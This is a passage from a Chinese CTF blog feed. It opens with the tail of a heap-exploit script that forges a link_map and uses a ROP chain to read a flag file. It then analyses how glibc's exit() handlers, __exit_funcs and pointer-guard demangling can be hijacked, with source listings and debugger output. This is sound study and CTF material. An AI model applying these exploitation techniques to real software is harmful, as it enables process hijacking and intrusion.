class="number">0x200</span> - <span class="number">0x10</span> + <span class="number">0xa8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="built_in">open</span>) <span class="comment">#rcx</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x31c</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p8(<span class="number">0x8</span>) <span class="comment"># l_init_called</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x330</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    ropchain = p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + \</span><br><span class="line">            p64(chunk_addr + <span class="number">0x450</span>) + p64(pop_rdx_r12_ret) + \</span><br><span class="line">            p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(read) + p64(pop_rdi_ret) + \</span><br><span class="line">            p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(chunk_addr + <span class="number">0x450</span>) + \</span><br><span class="line">            p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(write)</span><br><span class="line"></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x350</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + ropchain</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">2</span>, link_map)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = start()</span><br><span class="line">        pwn()</span><br><span class="line">        io.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>).encode())</span><br><span class="line">        io.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> exit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于exit的利用以及一个程序的开始到结束</title>
      <link href="/2025/08/30/%E5%85%B3%E4%BA%8Eexit%E7%9A%84%E5%88%A9%E7%94%A8%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%BC%80%E5%A7%8B%E5%88%B0%E7%BB%93%E6%9D%9F/"/>
      <url>/2025/08/30/%E5%85%B3%E4%BA%8Eexit%E7%9A%84%E5%88%A9%E7%94%A8%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%BC%80%E5%A7%8B%E5%88%B0%E7%BB%93%E6%9D%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>迎新练习赛@powchan出了一个神人题目<code>It&#39;s my 钩</code>，主要是打<code>exit()</code>的几个<code>hook</code>，同时打lilctf2025的一道静态堆题的时候也找到了几篇关于<code>fini_array</code>的利用，也是<code>exit()</code>的一个利用点，于是催生了我记录一下<code>exit()</code>的利用的想法<br>参考博客<a href="https://www.anquanke.com/post/id/243196">exit()分析与利用-安全KER - 安全资讯平台</a><br>以下贴出的glibc源码皆为2.35版本</p><h2 id="0x01-exit-的流程"><a href="#0x01-exit-的流程" class="headerlink" title="0x01 exit()的流程"></a>0x01 exit()的流程</h2><p>注意内核层面的系统调用<code>_exit()</code>和用户层面的<code>exit()</code>是不同的，前者负责释放一个内核层面的资源，比如文件描述符等，后者则是负责释放用户层面的资源，比如io流的缓冲区，<code>tls</code>，等等<br>我们所利用的正是用户层面的<code>exit()</code><br>现在我们找到<code>exit()</code>的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>__exit_funcs</code>我们找到定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="type">void</span> (*at) (<span class="type">void</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">  &#125; on;</span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">    <span class="type">void</span> *dso_handle;</span><br><span class="line">  &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span></span><br><span class="line">  &#125;;</span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *__<span class="title">exit_funcs</span> <span class="title">attribute_hidden</span>;</span></span><br></pre></td></tr></table></figure><p>是一个用于管理析构函数的结构，先按下不表<br>我们看到<code>exit()</code>就是对<code> __run_exit_handlers()</code>的封装，我们找到<code> __run_exit_handlers()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">     <span class="type">bool</span> run_list_atexit, <span class="type">bool</span> run_dtors)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (run_dtors)</span><br><span class="line">      __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Exit processing complete.  We will not allow any more</span></span><br><span class="line"><span class="comment">     atexit/on_exit registrations.  */</span></span><br><span class="line">  __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">      <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">      <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">      <span class="type">void</span> *arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ef_free:</span><br><span class="line">    <span class="keyword">case</span> ef_us:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_on:</span><br><span class="line">      onfct = f-&gt;func.on.fn;</span><br><span class="line">      arg = f-&gt;func.on.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      onfct (status, arg);</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_at:</span><br><span class="line">      atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      atfct ();</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">      <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment"> we must mark this function as ef_free.  */</span></span><br><span class="line">      f-&gt;flavor = ef_free;</span><br><span class="line">      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">      arg = f-&gt;func.cxa.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      cxafct (arg, status);</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">    <span class="comment">/* The last exit function, or another thread, has registered</span></span><br><span class="line"><span class="comment">       more exit functions.  Start the loop over.  */</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line"><span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">   allocate element.  */</span></span><br><span class="line"><span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其主要流程为（感谢chatgpt帮我画图）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">用户调用 exit(status)</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">┌───────────────────────────────────────────┐</span><br><span class="line">│        __run_exit_handlers(status)        │</span><br><span class="line">└───────────────────────────────────────────┘</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">   调用 TLS 析构函数 (__call_tls_dtors)</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">   遍历 exit_function_list 链表</span><br><span class="line">        │</span><br><span class="line">        ├── ef_cxa → 调用 __cxa_atexit 注册的函数 (C++ 析构)</span><br><span class="line">        │</span><br><span class="line">        ├── ef_at  → 调用 atexit 注册的函数</span><br><span class="line">        │</span><br><span class="line">        ├── ef_on  → 调用 on_exit 注册的函数 (带 status, arg)</span><br><span class="line">        │</span><br><span class="line">        └── (其他类型跳过)</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">   若执行期间有新的回调注册 → 回到链表开头重新执行</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">   释放动态分配的回调节点</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">   如果 run_list_atexit = true → 执行 __libc_atexit 钩子</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">   最终调用 _exit(status)</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">   内核：彻底终止进程</span><br></pre></td></tr></table></figure><p>以pwn的眼光来看，自然在这流程中发现许多可以利用的点</p><h2 id="0x02-exit-funcs"><a href="#0x02-exit-funcs" class="headerlink" title="0x02 __exit_funcs"></a>0x02 __exit_funcs</h2><p>劫持<code>__exit_funcs</code>链表<br>既然<code>__run_exit_handles()</code>会遍历<code>__exit_funcs</code>链表并执行其中函数，那么我们劫持这个链表就可以劫持程序执行流了….吗？<br>我们调试一下便知</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c455f0 &lt;exit&gt;         endbr64</span><br><span class="line">0x7ffff7c455f4 &lt;exit+4&gt;       push   rax</span><br><span class="line">0x7ffff7c455f5 &lt;exit+5&gt;       pop    rax                       RAX =&gt; 0x555555555149 (main)</span><br><span class="line">0x7ffff7c455f6 &lt;exit+6&gt;       mov    ecx, 1                    ECX =&gt; 1</span><br><span class="line">0x7ffff7c455fb &lt;exit+11&gt;      mov    edx, 1                    EDX =&gt; 1</span><br><span class="line">0x7ffff7c45600 &lt;exit+16&gt;      lea    rsi, [rip + 0x1d5231]     RSI =&gt; 0x7ffff7e1a838 (__exit_funcs) —▸ 0x7ffff7e1bf00 (initial) ◂— 0</span><br><span class="line">0x7ffff7c45607 &lt;exit+23&gt;      sub    rsp, 8                    RSP =&gt; 0x7fffffffdb50 (0x7fffffffdb58 - 0x8)</span><br><span class="line">0x7ffff7c4560b &lt;exit+27&gt;      call   __run_exit_handlers         &lt;__run_exit_handlers&gt;</span><br></pre></td></tr></table></figure><p>我们看调用<code>__run_exit_handlers</code>前的<code>rsi</code>也就是第二个参数<code>&amp;__exit_funcs</code>，我们由此找到<code>__exit_funcs</code>链表查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct exit_function_list*) 0x7ffff7e1bf00</span><br><span class="line">$2 = &#123;</span><br><span class="line">  next = 0x0,</span><br><span class="line">  idx = 1,</span><br><span class="line">  fns = &#123;&#123;</span><br><span class="line">      flavor = 4,</span><br><span class="line">      func = &#123;</span><br><span class="line">        at = 0xf52c223ea4f375e4,</span><br><span class="line">        on = &#123;</span><br><span class="line">          fn = 0xf52c223ea4f375e4,</span><br><span class="line">          arg = 0x0</span><br><span class="line">        &#125;,</span><br><span class="line">        cxa = &#123;</span><br><span class="line">          fn = 0xf52c223ea4f375e4,</span><br><span class="line">          arg = 0x0,</span><br><span class="line">          dso_handle = 0x0</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      flavor = 0,</span><br><span class="line">      func = &#123;</span><br><span class="line">        at = 0x0,</span><br><span class="line">        on = &#123;</span><br><span class="line">          fn = 0x0,</span><br><span class="line">          arg = 0x0</span><br><span class="line">        &#125;,</span><br><span class="line">        cxa = &#123;</span><br><span class="line">          fn = 0x0,</span><br><span class="line">          arg = 0x0,</span><br><span class="line">          dso_handle = 0x0</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; &lt;repeats 31 times&gt;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到<code>0xf52c223ea4f375e4</code>这个诡异的值，显然不是<code>fns[0].on.fn</code>指针该有的值，是被加密后的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c4541a &lt;+138&gt;:   mov    rax,QWORD PTR [rdx+0x18]</span><br><span class="line">0x00007ffff7c4541e &lt;+142&gt;:   mov    rsi,QWORD PTR [rdx+0x20]</span><br><span class="line">0x00007ffff7c45422 &lt;+146&gt;:   mov    edx,ebx</span><br><span class="line">0x00007ffff7c45424 &lt;+148&gt;:   ror    rax,0x11</span><br><span class="line">0x00007ffff7c45428 &lt;+152&gt;:   xor    rax,QWORD PTR fs:0x30</span><br><span class="line">0x00007ffff7c45431 &lt;+161&gt;:   xchg   DWORD PTR [r14],edx</span><br><span class="line">0x00007ffff7c45434 &lt;+164&gt;:   cmp    edx,0x1</span><br><span class="line">0x00007ffff7c45437 &lt;+167&gt;:   jg     0x7ffff7c45558 &lt;__run_exit_handlers+456&gt;</span><br><span class="line">0x00007ffff7c4543d &lt;+173&gt;:   mov    edi,ebp</span><br><span class="line">0x00007ffff7c4543f &lt;+175&gt;:   call   rax</span><br></pre></td></tr></table></figure><p>看到这里自然释然了，原来是根据<code>fs:0x30</code>处的值来解密<br><code>fs</code>是一个段寄存器, x86架构没有对fs怎么使用做出明确规定, linux中让<code>fs</code>指向当前线程的控制块, 也就是<code>tcbhead_t</code>结构体, 也就是说 <code>fs:0x30</code> 寻址结果和 <code>*(tcbhead_t+0x30)</code> 一样，<code>tcbhead_t</code>结构体定义如下，位于<code>tls.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *tcb;<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> unused_vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> feature_1;</span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>可以看到<code>fs:0x28</code>也就是<code>tcbhead_t+0x28</code>处正是<code>canary</code>保护所使用的值<code>stack_guard</code>，我们这里解密使用的是<code>fs:0x30</code>的<code>pointer_guard</code>，泄露这个值才可能劫持<code>__exit_funcs</code>链表。<br></p><h2 id="0x03-exit-function注册-以及-elf程序的start与exit"><a href="#0x03-exit-function注册-以及-elf程序的start与exit" class="headerlink" title="0x03 exit_function注册 以及 elf程序的start与exit"></a>0x03 exit_function注册 以及 elf程序的start与exit</h2><p>我们再回头看流程，遍历链表执行的是<code>atexit</code>等函数注册的函数，我们找到<code>atexit</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Register FUNC to be executed by `exit&#x27;.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> atexit</span></span><br><span class="line">attribute_hidden</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">atexit (<span class="type">void</span> (*func) (<span class="type">void</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __cxa_atexit ((<span class="type">void</span> (*) (<span class="type">void</span> *)) func, <span class="literal">NULL</span>, __dso_handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现只是对<code>__cxa_atexit</code>的封装</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Register a function to be called by exit or when a shared library</span></span><br><span class="line"><span class="comment">   is unloaded.  This function is only called from code generated by</span></span><br><span class="line"><span class="comment">   the C++ compiler.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__cxa_atexit (<span class="type">void</span> (*func) (<span class="type">void</span> *), <span class="type">void</span> *arg, <span class="type">void</span> *d)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __internal_atexit (func, arg, d, &amp;__exit_funcs);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__cxa_atexit)</span><br></pre></td></tr></table></figure><p>发现还是封装…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 